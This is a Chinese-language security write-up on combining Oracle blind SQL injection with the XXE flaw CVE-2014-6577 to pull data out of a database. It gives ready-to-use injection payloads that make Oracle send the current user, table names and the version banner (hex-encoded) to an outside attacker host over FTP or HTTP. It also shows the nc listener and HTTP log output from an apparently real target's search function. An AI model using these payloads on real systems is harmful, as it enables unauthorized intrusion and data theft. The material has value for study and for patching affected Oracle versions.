# Oracle盲注结合XXE漏洞远程获取数据

0x00 前言
=======

* * *

想必大家对SQL注入已经耳熟能详，对XML实体注入（简称XXE）也有所了解。本文主要讨论了一种在存在ORACLE盲注的情况下远程获取数据的方式。其实和UTL_HTTP远程获取的方法差不多，只不过原理不同。

0x01 漏洞简析
=========

* * *

CVE-2014-6577，是Oracle在今年年初修补的XXE漏洞，已知受影响的范围：

11.2.0.3, 11.2.0.4, 12.1.0.1, 12.1.0.2，不排除那些已不受oracle支持的版本也存在此漏洞。攻击者可以通过利用构造SQL语句来触发XML解释器发送一个HTTP或者FTP请求，从而带来以下可能的威胁。

*   数据泄露
*   SSRF
*   端口扫描
*   拒绝服务攻击。

等等……

0x02 漏洞利用
=========

* * *

文献中给出的一个利用POC：

在远程主机上用nc监听21端口，当有连接后，输入220

```
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "ftp://'||user||':bar@11.11.11.11/test"> %remote; %param1;]>'),'/l') from dual;

```

and

```
[root@localhost httpd]# busybox nc -vvlp 21
listening on [::]:21 ...
connect to [::ffff:11.11.11.11]:21 from [::ffff:22.22.22.22]:37040 ([::ffff: 22.22.22.22]:37040)
220
USER XXXX _WEB_ XXXX
220
PASS bar
^Csent 8, rcvd 33
punt!

```

在断开连接的同时，ORACLE会报以下错误

将把给出的POC变形，ftp请求换成http，

```
ORA-31000: 资源 'ftp://XXXX_WEB_XXXX:bar@11.11.11.11/test' 不是 XDB 方案文档     

ORA-06512: 在 "SYS.XMLTYPE", line 310     

ORA-06512: 在 line 1
…………

```

and

```
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11.11.11.11/'||user||'"> %remote; %param1;]>'),'/l') from dual

```

这样不用启动nc或者ftp服务端即可在http日志中收到请求:

```
22.22.22.22  - - [27/Apr/2015:07:56:53 -0400] "GET /XXXX_WEB_XXXX  HTTP/1.0" 404 294 "-" "-"

```

0x03 漏洞实战
=========

* * *

某个搜索功能存在SQL注入漏洞

可以判断存在盲注，而且数据库基本能确定为oracle

```
XXX%'and 233=233 '%'='              页面正常
XXX%'and 233=2333 '%'='             页面无结果
XXX%'and 1=(select 1 from dual) '%'='   页面正常

```

构造如下语句 服务器收到如下请求：

```
XXX%'and 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11.11.11.11/'||(SELECT TABLE_NAME FROM (SELECT ROWNUM AS R,TABLE_NAME FROM USER_TABLES) WHERE R=1)||'"> %remote; %param1;]>'),'/l') from dual) and '%'='

```

and

```
22.22.22.22 - - [27/Apr/2015:22:00:46 -0400] "GET /EC_COMP_BINARY_INFO HTTP/1.0" 404 297 "-" "-"

```

还可以这么构造，一次返回数条结果

服务器收到如下请求：

对于结果中带空白符或者其他特殊符号的，在此处Oracle并不会自动URL编码，所以为了顺利的获得数据可以用oracle的自带函数utl_raw.cast_to_raw()将结果转换为HEX。

```
22.22.22.22 - - [27/Apr/2015:23:12:01 -0400] "GET /EC_COMP_BINARY_INFO////EC_COMP_BINARY_MAPPING HTTP/1.0" 404 323 "-" "-"

```

and

```
XXX%'and 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11.11.11.11/'||(SELECT utl_raw.cast_to_raw(BANNER) FROM (SELECT ROWNUM AS R,BANNER FROM v$version) WHERE R=1)||'////'||(SELECT utl_raw.cast_to_raw(BANNER) FROM (SELECT ROWNUM AS R,BANNER FROM v$version) WHERE R=2)||'"> %remote; %param1;]>'),'/l') from dual) and '%'='

```

收到的请求：

经过HEX解码可得

```
/Oracle Database 11g Enterprise Edition Release 11.2.0.2.0 - 64bit Production////PL/SQL Release 11.2.0.2.0 - Production

22.22.22.22 - - [28/Apr/2015:03:50:16 -0400] "GET /4F7261636C652044617461626173652031316720456E74657270726973652045646974696F6E2052656C656173652031312E322E302E322E30202D2036346269742050726F64756374696F6E////504C2F53514C2052656C656173652031312E322E302E322E30202D2050726F64756374696F6E HTTP/1.0" 404 510 "-" "-"

```

参考文献：
=====

* * *

https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/